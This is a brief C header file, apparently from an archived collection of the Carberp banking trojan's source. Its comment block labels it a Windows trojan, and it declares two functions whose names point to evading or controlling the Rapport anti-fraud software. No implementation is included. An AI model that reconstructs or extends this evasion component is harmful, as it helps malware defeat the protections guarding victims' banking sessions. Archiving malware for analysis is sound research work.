/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#ifndef _ANTIRAPPORT_H_
#define _ANTIRAPPORT_H_

VOID AntiRapStart();
BOOL AntiRapControlThreads(HANDLE hProcess, DWORD dwPid);

#endif